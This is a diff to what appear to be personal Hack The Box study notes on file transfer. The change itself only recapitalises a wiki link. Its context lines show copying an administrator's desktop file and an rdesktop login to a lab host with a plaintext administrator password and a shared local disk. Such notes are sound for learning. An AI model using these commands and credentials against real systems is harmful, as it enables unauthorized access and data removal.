@@ -151,7 +151,7 @@ PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destin
 ```
 
 #### RDP
-[[rdp]]
+[[RDP]]
 ```shell
 rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
 ```
